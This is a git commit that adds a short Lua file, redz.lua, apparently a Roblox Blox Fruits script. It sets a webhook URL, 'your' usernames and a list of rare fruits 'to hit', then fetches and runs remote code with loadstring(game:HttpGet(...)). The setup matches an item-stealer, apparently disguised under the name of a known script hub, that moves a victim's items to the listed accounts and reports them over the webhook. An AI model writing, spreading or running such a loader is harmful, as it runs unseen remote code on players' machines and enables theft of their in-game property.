ea2d4a53096dc0b1a12235180783bd92f14414b1
redz242 <oserkola1@gmail.com>
2025-03-08 16:06:41 +0100

    Create redz.lua

---
+++ redz.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=M2I0QmdJNkZJeU0zVnhBMGtPLUYzdzpZb3E2NEpFUkxsSzZXSDlnWDk5c2RuUk92RUxDbXlVWGdaUTFmTjdsMzN5TWRldVFvTjdYSnFhck1pY2pIMkc0a2xWR3ZqRVlRaXg0a19Za1FsTWsyUDVxdnkxMFdLVlNjT2I1Q01ETmNpM1BnalE5NFMzaVNjdDJES1h0Z0xGaGdsY3pfVi1MZUZOWnBVQXZkZFVfVVp2VElfVmVGZFo0a1dlY2RIeDE2STg" -- << Your Webhook
+Usernames = {"PhoenixAot9898", "PhoenixAot"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Dragon-Dragon (East)", "Yeti-Yeti", "Dragon-Dragon (West)"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
